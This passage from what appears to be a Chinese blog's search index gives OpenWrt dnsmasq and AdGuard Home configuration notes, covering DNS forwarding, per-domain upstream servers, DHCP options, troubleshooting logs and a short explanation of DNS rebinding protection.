<li><code>localservice</code>\uff1a\u53ea\u5141\u8bb8\u6765\u81ea\u672c\u5730\u7f51\u7edc\u7684 DNS \u67e5\u8be2\uff0c\u5982\u679c\u5e0c\u671b\u8def\u7531\u5668\u4f5c\u4e3a\u522b\u7684\u7f51\u7edc\u7684 dns \u670d\u52a1\u5668\uff0c\u9700\u8981\u8bbe\u7f6e\u4e3a 0\u3002Accept\u00a0DNS\u00a0queries only from hosts whose address is on a local subnet, ie a subnet for which an interface exists on the server.</li> </ul> <pre><code>config dnsmasq\n        option domainneeded '1'          # \u4e0d\u5411\u4e0a\u6e38\u67e5\u8be2\u7eaf\u57df\u540d\u3002\u4f8b\u5982\uff0c\u53ea\u5305\u542b\u4e3b\u673a\u540d\u800c\u4e0d\u5305\u542b\u4efb\u4f55\u70b9\u53f7\u7684\u57df\u540d\u4e0d\u4f1a\u88ab\u8f6c\u53d1\u5230\u4e0a\u6e38 DNS \u670d\u52a1\u5668\u3002\n        option boguspriv '1'             # \u4e0d\u53cd\u5411\u67e5\u8be2\u4e0d\u5728 hosts \u4e2d\u7684\u79c1\u6709 ip \u6bb5\n        option filterwin2k '0'\n        option localise_queries '1'      # \u5982\u679c\u4e3b\u673a\u6709\u591a\u4e2a ip\uff0c\u6839\u636e\u67e5\u8be2\u63a5\u53e3\u7684\u4e0d\u540c\u8fd4\u56de\u4e0d\u540c\u7ed3\u679c\n        option rebind_localhost '1'      # \u5141\u8bb8\u4e0a\u6e38\u8fd4\u56de 127.0.0.0/8\n        option rebind_protection '0'     # 1 \u65f6, \u4e0a\u6e38\u8fd4\u56de private \u5730\u5740\u65f6\uff08RFC1918\uff09\u5c06\u5176\u4e22\u5f03\n        option local '/op2/'             # \u5c06 local \u57df\u540d\u91cd\u5b9a\u5411\u5230\u672c\u5730\u7684 /etc/hosts\n        option domain 'op2'              # \u8bbe\u7f6e DHCP \u670d\u52a1\u5668\u8fd4\u56de\u7684 domain\n        option expandhosts '1'           # \u5c06 hosts \u4e2d\u627e\u5230\u7684\u4e3b\u673a\u540d\u90fd\u6dfb\u52a0 domain\n        option nonegcache '0'            # 0 \u65f6\uff0c\u7f13\u5b58 \"no such domain\" \u7ed3\u679c\n        option cachesize '8000'\n        option authoritative '1'         # dnsmasq \u662f\u672c\u5730\u7f51\u7edc\u7684\u6743\u5a01 DHCP \u670d\u52a1\u5668\n        option readethers '1'            # Read static lease entries from\u00a0`/etc/ethers`\n        option leasefile '/tmp/dhcp.leases'                      # \u6307\u5b9a DHCP \u79df\u7ea6\u6587\u4ef6\u7684\u5b58\u50a8\u4f4d\u7f6e\n        option resolvfile '/tmp/resolv.conf.d/resolv.conf.auto'  # \u6307\u5b9a\u5305\u542b\u4e0a\u6e38 DNS \u670d\u52a1\u5668\u7684\u914d\u7f6e\u6587\u4ef6\n        option nonwildcard '1'           # \u53ea\u7ed1\u5b9a\u6307\u5b9a\u63a5\u53e3\u7684\u5730\u5740\n        option localservice '1'          # \u53ea\u5141\u8bb8\u6765\u81ea\u672c\u5730\u7f51\u7edc\u7684 DNS \u67e5\u8be2\n        option filter_a '0'              # 0 \u65f6\uff0c\u7981\u7528 A \u8bb0\u5f55\u8fc7\u6ee4\u3002\n        option filter_aaaa '0'           # 0 \u65f6\uff0c\u7981\u7528 AAAA \u8bb0\u5f55\u8fc7\u6ee4\u3002\n        option mini_ttl '3600'\n        option dns_redirect '1'\n        option ednspacket_max '1232'\n        # \u81ea\u5df1\u901a\u5e38\u4f1a\u4fee\u6539\u7684\n        option port '53'\n        list listen_address '0.0.0.0'   # \u907f\u514d dnsmaq \u5bf9\u6bcf\u4e2a\u63a5\u53e3\u7ed1\u5b9a\u4e00\u4e2a \u5730\u5740\uff0c\u66f4\u52a0\u7b80\u6d01\n        list listen_address '::'\n        option confdir '/etc/dnsmasq.d'\n        option localservice '0'    # \u5141\u8bb8\u975e\u5c40\u57df\u7f51\u5185\u8bbe\u5907\u8bbf\u95ee\uff0c\u5373\u4f7f bind_adder\n        option noresolv '1'        # \u4e0d\u4f7f\u7528\u4e0a\u6e38 dns\uff0c\u800c\u53ea\u662f\u7528 dnsmasq \u914d\u7f6e\u6587\u4ef6\u4e2d\u8bbe\u7f6e\u7684\u4e0a\u6e38 dns\n        option localuse '1'        # Use\u00a0dnsmasq\u00a0as a local system resolver.\n        option cachesize '0'       # \u7981\u7528\u7f13\u5b58\uff0c\u6bcf\u6b21\u90fd\u5411\u4e0a\u6e38\u8bf7\u6c42\n        option allservers '0'\n</code></pre> <p><code>listen_addresses</code> \u548c <code>bind_interface</code>\uff1aOn systems which support it, dnsmasq binds the wildcard address, even when it is listening on only some interfaces. It then discards requests that it shouldn't reply to. This has the advantage of working even when interfaces come and go and change address.</p> <pre><code># Include another lot of configuration options.\n#conf-file=/etc/dnsmasq.more.conf\n#conf-dir=/etc/dnsmasq.d\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u8f6c\u53d1\u8bf7\u6c42","title":"\u8f6c\u53d1\u8bf7\u6c42","text":"<ul> <li>\u8f6c\u53d1\u7ed9\u5176\u5b83dns<ul> <li>\u4e0b\u9762\u662fopenclash\u9009\u62e9\u4e86\u91cd\u5b9a\u5411dnsmasq\u540e\u7684\u914d\u7f6e\u3002\u53ef\u4ee5\u5173\u95ed\u540e\u624b\u52a8\u7ef4\u62a4\uff08\u4fbf\u4e8e\u5207\u6362\u5230adguard home\u7b49\u5176\u5b83dns\uff09</li> <li>noresolv\u8868\u793a\u4e0d\u4f7f\u7528\u4e0a\u6e38dns</li> <li>cachesize=0\uff0c\u8868\u793a\u7981\u7528\u7f13\u5b58\uff0c\u6bcf\u4e2adns\u8bf7\u6c42\u90fd\u88ab\u8f6c\u53d1\u7ed9openclash</li> </ul> </li> </ul> <pre><code>config dnsmasq\n      ...\n      list server '127.0.0.1#7874'\n      option noresolv '1'\n      option cachesize '0'\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#dhcp-option","title":"dhcp option","text":"<ul> <li>3\uff1a\u8bbe\u7f6e\u9ed8\u8ba4\u7f51\u5173</li> <li>6\uff1a\u8bbe\u7f6edns<ul> <li>\u65e0\u6cd5\u6307\u5b9a\u7aef\u53e3</li> </ul> </li> </ul> <p>luci\uff1ainterface -&gt; lan -&gt; edit ... \u914d\u7f6e\u6587\u4ef6\uff1adhcp</p> <pre><code>config dhcp 'lan'\n    ...\n    list dhcp_option '6,192.168.36.1'\n</code></pre> <p>\u67e5\u770b\u6240\u6709\u652f\u6301\u7684\u9009\u9879 <pre><code>dnsmasq --help dhcp\n\n 3 router\n 6 dns-server\n15 domain-name\n26 mtu\n</code></pre></p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#dns\u5206\u6d41","title":"dns\u5206\u6d41","text":"<p>\u4ee5\u4e0b\u8bbe\u7f6e\u9ed8\u8ba4\u5c06dns\u8f6c\u53d1\u7ed9<code>127.0.0.1:7874</code>\uff08clash dns\uff09\uff0c\u5bf9\u4e8e<code>*.my.to</code>\u8f6c\u53d1\u7ed9119.29.29.29</p> <pre><code>option localservice '0'\n        option port '53'\n        #option resolvfile '/tmp/resolv.conf.d/resolv.conf.auto'\n        option noresolv '1'\n        option serverlist '/etc/dnsmasq.servers'\n        list server '127.0.0.1#7874'\n        list server '/my.to/119.29.29.29'\n        list server '/us.to/119.29.29.29'\n        list server '/zhenwei.site/119.29.29.29'\n        list server '119.29.29.29'\n        option cachesize '500'\n</code></pre> <p>\u6216\u8005\u5728\u5355\u72ec\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u914d\u7f6e</p> <pre><code>option confdir '/etc/dnsmasq.d'\n\nvim /etc/dnsmasq.d/dnsmasq_accelerated-domains.china.conf\n\nserver=/baidu.cc/202.38.64.56\nserver=/baidu.cm/202.38.64.56\nserver=/baidu.com/202.38.64.56\nserver=/baidu.jp/202.38.64.56\n</code></pre> <p>server \u53ef\u4ee5\u6307\u5b9a\u591a\u6b21\uff0c\u9700\u8981\u628a allservers \u6253\u5f00 dnsmasq - Multiple forwarding servers for domain entries? - Server Fault</p> <p>allservers</p> <p>By default, when dnsmasq has more than one upstream server available, it will send queries to just one server. Setting this parameter forces dnsmasq to send all queries to all available servers. The reply from the server which answers first will be returned to the original requeser.</p> <p>p.s. \u5982\u679c\u4e00\u4e2a server \u8fd4\u56de\u7a7a\u503c\uff0c\u4e00\u4e2a\u4e4b\u540e\u8fd4\u56de\u771f\u5b9e\u503c\u3002\u90a3\u4e48\u4ecd\u7136\u6309\u7167\u7b2c\u4e00\u4e2a\u8fd4\u56de\u7a7a</p> <p>\u6307\u5b9a\u591a dns server\uff0c\u9002\u7528\u4e8e\u6821\u5185\u548c\u6821\u5916\u4e24\u79cd\u60c5\u51b5</p> <pre><code>server=/yfycloud.site/223.5.5.5\nserver=/yfycloud.site/202.38.64.56\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#bind\u63a5\u53e3\u548c\u975e\u5c40\u57df\u7f51\u8bbf\u95ee","title":"bind\u63a5\u53e3\u548c\u975e\u5c40\u57df\u7f51\u8bbf\u95ee","text":"<p>\u5bb9\u6613\u641e\u6df7\u7684\u9009\u9879</p> <ul> <li>localise_queries(1): Choose\u00a0IP\u00a0address to match the incoming interface if multiple addresses are assigned to a host name in\u00a0<code>/etc/hosts</code>. Initially\u00a0disabled, but still\u00a0enabled\u00a0in the config by default.\u00a0\u00a0Note well the spelling of this option.</li> <li>localservice(0): Accept\u00a0DNS\u00a0queries only from hosts whose address is on a local subnet, ie a subnet for which an interface exists on the server.</li> </ul> <p>dnsmasq\u9ed8\u8ba4\u76d1\u542c\u6240\u6709\u63a5\u53e3\uff08\u4f46\u662f\u4e0d\u662fbind\u5230<code>::</code>\uff0c\u800c\u662fbind\u6240\u6709\u672c\u5730\u5730\u5740\uff09 localservice\u63a7\u5236\u662f\u5426\u5141\u8bb8\u5176\u5b83\u7f51\u6bb5\u8bbf\u95ee\u3002\u6bd4\u8f83\u7279\u522b\u7684\u662f\uff0c\u5982\u679c\u624b\u52a8\u6307\u5b9a\u4e86bind interface\uff0c\u5219\u9664\u4e86\u5f00\u542flocalservice\uff0c\u8fd8\u9700\u8981\u4fdd\u8bc1\u7ed1\u5b9a\u4e86\u5bf9\u5e94\u63a5\u53e3\u3002</p> <pre><code>list interface wg_s2s\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u4e00\u4e9b\u53ef\u80fd\u6709\u7528\u7684\u914d\u7f6e\u9009\u9879","title":"\u4e00\u4e9b\u53ef\u80fd\u6709\u7528\u7684\u914d\u7f6e\u9009\u9879","text":"<ul> <li><code>rebind_protection 1</code>: Enables\u00a0DNS\u00a0rebind attack protection by discarding upstream RFC1918 responses DNS rebinding protection - Google Nest Help</li> <li>\u7528\u6237\u8bbf\u95ee\u4e00\u4e2a\u6076\u610f\u7f51\u7ad9\u65f6\uff0c\u6076\u610f\u7f51\u7ad9\u52a8\u6001\u5730\u5c06\u81ea\u5df1\u7684\u57df\u540d\u7ed1\u5b9a\u5230\u7528\u6237\u79c1\u6709\u5730\u5740\uff0c\u8fd9\u6837\u7528\u6237\u5c31\u4f1a\u53bb\u8bbf\u95ee\u672c\u5730\u7f51\u7edc\u3002\u4ece\u800c\u6076\u610f\u7f51\u7ad9\u53ef\u80fd\u83b7\u53d6\u7528\u6237\u7684\u79c1\u6709\u4fe1\u606f\u3002</li> </ul> <p>A DNS rebinding attack is performed when a malicious website pretends that\u00a0IP addresses\u00a0(usually IPs reserved for local networks) are part of their domain. This allows them to circumvent the same-origin policy implemented by browsers and view data from these IP addresses. A DNS rebinding attack can happen if someone using your network visits a malicious website that identifies your local IP address and deduces the structure of your local network. The malicious website could then bind their domains to the local IP address, send requests to devices on your network, and then read any responses to those requests. This could allow attackers to access some of your private information, or further compromise your network security.</p> <p>update 2024-02-03\uff1a\u73b0\u5728rebind_protection\u662f\u9ed8\u8ba4\u5f00\u542f\u7684\u3002\u56e0\u6b64\u9700\u8981\u663e\u793a\u8bbe\u7f6e\u4e3a0</p> <pre><code>option rebind_protection '0'\noption rebind_localhost '0\n</code></pre> <ul> <li><code>allservers 0</code>: By default, when dnsmasq has more than one upstream server available, it will send queries to just one server. Setting this parameter forces dnsmasq to send all queries to all available servers. The reply from the server which answers first will be returned to the original requeser.</li> </ul> <p>\u7ed1\u5b9a dns \u8bf7\u6c42\u7684\u6e90\u5730\u5740</p> <pre><code># You can control how dnsmasq talks to a server: this forces\n# queries to 10.1.2.3 to be routed via eth1\n# server=10.1.2.3@eth1\n</code></pre> <p>\u5c06\u57df\u540d\u5bf9\u5e94 ip \u81ea\u52a8\u6dfb\u52a0\u5230 ipset</p> <pre><code># Add the IPs of all queries to yahoo.com, google.com, and their\n# subdomains to the vpn and search ipsets:\n#ipset=/yahoo.com/google.com/vpn,search\n\n# Add the IPs of all queries to yahoo.com, google.com, and their\n# subdomains to netfilters sets, which is equivalent to\n# 'nft add element ip test vpn { ... }; nft add element ip test search { ... }'\n#nftset=/yahoo.com/google.com/ip#test#vpn,ip#test#search\n</code></pre> <p>\u7ed9\u57df\u540d\u7ed1\u5b9a\u4e00\u4e2a\u56fa\u5b9a ip force address</p> <pre><code># Add domains which you want to force to an IP address here.\n# The example below send any host in double-click.net to a local\n# web-server.\n#address=/double-click.net/127.0.0.1\n\n# --address (and --server) work with IPv6 addresses too.\n#address=/www.thekelleys.org.uk/fe80::20d:60ff:fe36:f83\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u9047\u5230\u7684\u95ee\u9898_1","title":"\u9047\u5230\u7684\u95ee\u9898","text":"<p><code>logqueries</code>: Log the results of\u00a0DNS\u00a0queries, dump cache on SIGUSR1, include requesting\u00a0IP</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#rebind_protection\u5bfc\u81f4\u65e0\u6cd5\u8fd4\u56de\u5c40\u90e8\u5730\u5740","title":"rebind_protection\u5bfc\u81f4\u65e0\u6cd5\u8fd4\u56de\u5c40\u90e8\u5730\u5740","text":"<pre><code>19:43:37.091228 IP 127.0.0.1.51697 &gt; 127.0.0.1.53: 15907+ A? jellyfin.yfycloud.top. (39)\n19:43:37.091314 IP 10.0.32.2.47023 &gt; 192.168.35.1.53: 50832+ A? jellyfin.yfycloud.top. (39)\n19:43:37.091349 IP 127.0.0.1.51697 &gt; 127.0.0.1.53: 16164+ AAAA? jellyfin.yfycloud.top. (39)\n19:43:37.091388 IP 10.0.32.2.33248 &gt; 192.168.35.1.53: 53062+ AAAA? jellyfin.yfycloud.top. (39)\n19:43:37.092516 IP 192.168.35.1.53 &gt; 10.0.32.2.33248: 53062 1/0/0 AAAA :: (67)\n19:43:37.092518 IP 192.168.35.1.53 &gt; 10.0.32.2.47023: 50832 1/0/0 A 192.168.35.2 (55)\n19:43:37.092643 IP 127.0.0.1.53 &gt; 127.0.0.1.51697: 15907 0/0/0 (39)\n19:43:37.092713 IP 127.0.0.1.53 &gt; 127.0.0.1.51697: 16164 0/0/0 (39)\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u9012\u5f52\u5faa\u73af","title":"\u9012\u5f52\u5faa\u73af","text":"<pre><code>root@op2 \u279c  ~ nslookup debian12-docker.op2\nServer:         127.0.0.1\nAddress:        127.0.0.1:53\n\nName:   debian12-docker.op2\nAddress: 192.168.36.137\n\n** server can't find debian12-docker.op2: SERVFAIL   # \u4e5f\u53ef\u80fd\u662fno answer\n</code></pre> <pre><code>root@op2 \u279c  ~ tcpdump -ni any udp port 53 |grep debian\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on any, link-type LINUX_SLL (Linux cooked v1), capture size 262144 bytes\n10:42:06.385808 IP 127.0.0.1.53119 &gt; 127.0.0.1.53: 51457+ A? debian12-docker.op2. (37)\n10:42:06.385822 IP 127.0.0.1.53119 &gt; 127.0.0.1.53: 51714+ AAAA? debian12-docker.op2. (37)\n10:42:06.388495 IP 10.0.32.2.53348 &gt; 192.168.35.1.53: 13219+ AAAA? debian12-docker.op2. (37)\n10:42:06.389850 IP 10.0.32.1.59871 &gt; 192.168.36.1.53: 7106+ [1au] AAAA? debian12-docker.op2. (48)\n10:42:06.389983 IP 10.0.32.2.39748 &gt; 192.168.35.1.53: 20089+ [1au] AAAA? debian12-docker.op2. (48)\n10:42:06.391086 IP 10.0.32.1.37076 &gt; 192.168.36.1.53: 37382+ [1au] AAAA? debian12-docker.op2. (48)\n10:42:08.889751 IP 127.0.0.1.53119 &gt; 127.0.0.1.53: 51714+ AAAA? debian12-docker.op2. (37)\n10:42:08.890363 IP 10.0.32.2.53348 &gt; 192.168.35.1.53: 13219+ AAAA? debian12-docker.op2. (37)\n10:42:08.892259 IP 10.0.32.1.59755 &gt; 192.168.36.1.53: 7106+ [1au] AAAA? debian12-docker.op2. (48)\n10:42:08.892541 IP 10.0.32.2.39748 &gt; 192.168.35.1.53: 20089+ [1au] AAAA? debian12-docker.op2. (48)\n10:42:08.894341 IP 10.0.32.1.33708 &gt; 192.168.36.1.53: 37382+ [1au] AAAA? debian12-docker.op2. (48)\n10:42:08.894564 IP 10.0.32.2.39748 &gt; 192.168.35.1.53: 20089+ [1au] AAAA? debian12-docker.op2. (48)\n10:42:08.896553 IP 10.0.32.1.48899 &gt; 192.168.36.1.53: 37382+ [1au] AAAA? debian12-docker.op2. (48)\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u603b\u662f\u4f7f\u7528\u4e0a\u6e38-dnsnoresolve-\u5931\u6548","title":"\u603b\u662f\u4f7f\u7528\u4e0a\u6e38 dns\uff08noresolve \u5931\u6548\uff09","text":"<p>mi4a \u4e0a\uff0c\u5373\u4f7f\u8bbe\u7f6e\u4e86 noresolv\uff0c\u4f46\u662f\u4ecd\u7136\u4f1a\u6839\u636e <code>/tmp/resolv.conf.d/resolv.conf.auto</code> \u8fdb\u884c\u89e3\u6790\u3002 <pre><code>~/ cat /tmp/resolv.conf.d/resolv.conf.auto\n# Interface wwan0\n</code></pre></p> <p>\u89e3\u51b3\u529e\u6cd5\u4e3a\uff0c\u5728\u7f51\u7edc\u63a5\u53e3\u4e2d uncheck Use DNS servers advertised by peer\uff0c\u6216\u8005\u914d\u7f6e\u6587\u4ef6\u4e2d\u6dfb\u52a0  <code>option peerdns 0</code> <pre><code>config interface 'wwan0'\n        option proto 'dhcp'\n        option device 'wlan1_0'\n        option defaultroute '0'\n        option peerdns '0'\n</code></pre></p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#dnsadguardhome","title":"DNS/Adguardhome","text":"<p>\u4f7f\u7528Adguardhome\u4ee3\u66ffdnsmasq\u6709\u4e00\u4e9b\u597d\u5904</p> <ul> <li>\u66f4\u5bb9\u6613\u8fdb\u884cdns\u5206\u6d41</li> <li>\u7f8e\u89c2\u7684\u63a7\u5236\u9762\u677f\uff0c\u53ef\u4ee5\u770b\u5230\u7edf\u8ba1\u4fe1\u606f</li> <li>\u4e00\u4e9b\u9ad8\u7ea7\u7684dns filtering\u64cd\u4f5c\uff1ablock\u57df\u540d\uff0c\u8fd4\u56de\u6307\u5b9aip</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u5b89\u88c5_1","title":"\u5b89\u88c5","text":"<pre><code>opkg install adguardhome\n\n# \u542f\u52a8\u670d\u52a1\nservice adguardhome start\n</code></pre> <p>\u521d\u6b21\u5b89\u88c5\u9700\u8981\u8bbf\u95ee<code>&lt;ip_address&gt;:3000</code>\u8fdb\u884c\u521d\u59cb\u914d\u7f6e\u3002\u914d\u7f6e\u5b8c\u6210\u540e\u5728<code>/etc/adguardhome.yaml</code>\u4e2d\u751f\u6210\u914d\u7f6e\u6587\u4ef6\u3002</p> <p>\u6211\u4eec\u9700\u8981\u4f7f\u7528adguardhome\u4f5c\u4e3a\u4e3bdns\uff0c\u56e0\u6b64\u4fee\u6539\u539f\u672cdnsmasq\uff0c\u7ed1\u5b9a\u523054\u7aef\u53e3\u3002</p> <pre><code># vim /etc/config/dhcp\n\nconfig dnsmasq\n  ...\n  option port '54'\n  option cachesize '1000'\n  option rebind_protection '0'\n</code></pre> <p>\u6700\u540e\uff0c\u4fee\u6539adguradhome\u914d\u7f6e\u6587\u4ef6<code>/etc/adguardhome.yaml</code>\uff0c\u7ed1\u5b9a\u5230\u5c40\u57df\u7f51</p> <pre><code>dns:\n  bind_hosts:\n    - 127.0.0.1\n    - 192.168.36.1\n  port: 53\n</code></pre> <p><code>service adguardhome restart</code>\u91cd\u542f\u670d\u52a1</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#bind\u63a5\u53e3ip","title":"bind\u63a5\u53e3/ip","text":"<p>PD\u60c5\u51b5\u4e0b\uff0cohcpd\u4f1a\u5c06br-lan\u7684PD ip\u4f5c\u4e3aDNS\u54cd\u5e94\u7ed9lan\u5185\u8bbe\u5907\u3002\u4f46\u662fadguardhome dns\u9ed8\u8ba4\u6ca1\u6709\u76d1\u542c\u8be5ip\u3002 \u800c\u7531\u4e8ePD\u53ef\u80fd\u4f1a\u53d1\u751f\u53d8\u5316\uff0c\u56e0\u6b64\u4e5f\u6ca1\u529e\u6cd5\u624b\u52a8\u8bbe\u7f6e\uff08Adguardhome\u5e76\u4e0d\u652f\u6301bind\u5230\u6307\u5b9a\u63a5\u53e3\uff0c\u53ea\u80fd\u6307\u5b9a\u5177\u4f53ip\uff09 \u4e00\u4e2a\u53ef\u4ee5\u7684\u89e3\u51b3\u529e\u6cd5\u662f\uff1aodhcp\u4e2d\u8bbe\u7f6eDNS\u4e3afe80\u5730\u5740\uff0c\u7136\u540e\u5728AG\u4e2d\u8bbe\u7f6e\u7ed1\u5b9a\u5230\u8be5\u5730\u5740\u3002\u6ce8\u610f\uff1a\u7531\u4e8efe80\u5730\u5740\u53ef\u4ee5\u91cd\u590d\uff0c\u56e0\u6b64\u9700\u8981\u4f7f\u7528<code>%</code>\u683c\u5f0f\u6307\u5b9a\u63a5\u53e3\u3002</p> <pre><code>  bind_hosts:\n    - 192.168.35.1\n    - 127.0.0.1\n    - ::1   # ipv6\u7248\u672c\u7684127.0.0.1\uff0c\u53ea\u80fd\u672c\u673a\u8bbf\u95ee\n    - fe80::216:3eff:fe4b:6780%br-lan\n</code></pre> <p>\u76d1\u542c\u6240\u6709\u63a5\u53e3\uff08\u5305\u542bipv6\uff09</p> <pre><code>bind_hosts:\n   - 0.0.0.0\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#dns\u8bbe\u7f6e","title":"dns\u8bbe\u7f6e","text":"<p>\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u51e0\u79cd\u65b9\u5f0f\u914d\u7f6e\u4e0a\u6e38dns(upstream dns)</p> <ul> <li>GUI\u914d\u7f6e</li> <li>\u914d\u7f6e\u6587\u4ef6<code>upstream_dns</code></li> <li>\u914d\u7f6e\u6587\u4ef6<code>upstream_dns_file: /usr/share/adguardhome.upstream</code><ul> <li>\u4f1a\u7981\u7528upstream_dns\u5e76\u4e14GUI\u4e2d\u65e0\u6cd5\u770b\u5230</li> </ul> </li> </ul> <p>\u591a\u4e2adns\u6709\u4ee5\u4e0b\u7b56\u7565 </p> <p>\u5bf9\u5e94\u914d\u7f6e\u6587\u4ef6\u4e2d\u4ee5\u4e0b\u9009\u9879</p> <ul> <li><code>all_servers</code>: Enables parallel queries to all configured upstream servers to speed up resolving. If enabled, the queries are sent to each server simultaneously and the first response is chosen. If disabled, the queries are sent to each upstream server one-by-one and then sorted by RTT. Note that more stable upstream servers are preferred by the algorithm.</li> <li><code>fastest_addr</code>: Use the Fastest Address algorithm. It finds an IP address with the lowest latency and returns this IP address in DNS response.</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#dns\u5206\u6d41_1","title":"dns\u5206\u6d41","text":"<p>\u53ef\u4ee5\u6839\u636e\u57df\u540d\u9009\u62e9\u4f7f\u7528\u4e0d\u540cdns\u3002 Configuration \u00b7 AdguardTeam/AdGuardHome Wiki (github.com)</p> <p><code>/etc/adguardhome.yaml</code>\u4e2d\u542f\u7528\u4e0a\u6e38dns\u6587\u4ef6</p> <ul> <li><code>upstream_dns_file</code>: Path to a file with the list of upstream DNS servers. If it is configured, the value of\u00a0<code>upstream_dns</code>\u00a0is ignored.</li> </ul> <pre><code>dns:\n  upstream_dns_file: /usr/share/adguardhome.upstream   \n</code></pre> <p><code>/usr/share/adguardhome.upstream</code>\u8bbe\u7f6e\u4e0a\u6e38dns</p> <ul> <li><code>[xxx]#</code>: <code>#</code>\u8868\u793a\u4f7f\u7528\u9ed8\u8ba4dns</li> <li><code>[*.my.to]</code>\u548c<code>[my.to]</code>\u6709\u4e00\u4e9b\u533a\u522b\u3002\u524d\u8005\u5fc5\u987b\u662fmy.to\u7684\u5b50\u57df\u540d\uff0c\u4e0d\u5305\u62ecmy.to\u81ea\u8eab\uff0c\u800c\u540e\u8005\u5305\u542b\u81ea\u8eab\u53ca\u5b50\u57df\u540d\u3002</li> </ul> <pre><code># Default\n127.0.0.1:7874    # clash dns\uff0c\u5173\u95edipv6\u89e3\u6790\n\n# my network\n[/lan/]127.0.0.1:54   # \u5c40\u57df\u7f51\u8bbe\u5907 *.lan\u89e3\u6790\n\n[/my.to/]202.38.64.56  # \u4f7f\u7528\u5b66\u6821dns\uff0c\u5728\u65e0\u7f51\u7edc\u65f6\u89e3\u6790\u8def\u7531\u5668ipv6\uff0c\u7528\u4e8e\u5efa\u7acbwg\n[/us.to/]202.38.64.56\n\n# \u5176\u4f59\u9700\u8981ipv6\u57df\u540d\n[/pt/]119.29.29.29\n[/ipw.cn/]119.29.29.29  # \u53cc\u6808\uff0c\u6d4b\u8bd5\u7528\n[/wikipedia.org/]119.29.29.29\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#filters\u81ea\u5b9a\u4e49\u57df\u540d\u89e3\u6790","title":"filters/\u81ea\u5b9a\u4e49\u57df\u540d\u89e3\u6790","text":"<p>Hosts Blocklists \u00b7 AdguardTeam/AdGuardHome Wiki (github.com)</p> <p>\u4f4d\u4e8e\u7f51\u9875Filters -&gt; custom filtering rules\u83dc\u5355\u4e2d\uff0c\u4ee5hosts\u6587\u4ef6\u7684\u683c\u5f0f\u8bbe\u7f6e\u57df\u540dip\u5373\u53ef\u3002</p> <ul> <li>\u8be5\u529f\u80fd\u8fd8\u652f\u6301\u5bf9\u57df\u540d\u8fdb\u884cblocking\uff0c\u89c1\u7f51\u9875\u4e2d\u7ed9\u51fa\u7684\u4f8b\u5b50\u3002 </li> 